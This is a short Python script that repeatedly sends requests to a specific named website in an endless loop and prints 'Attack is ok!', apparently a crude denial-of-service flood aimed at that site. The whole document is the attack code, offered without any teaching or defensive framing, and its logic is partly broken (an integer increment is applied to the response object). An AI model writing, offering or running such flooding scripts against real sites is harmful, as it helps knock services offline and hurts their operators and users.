from urllib.request import *
a=1
while True:
	try:
		a=urlopen('https://profnavigator.uz/',True)
		print('')
		a+=1
	except:
		print('Attack is ok!')
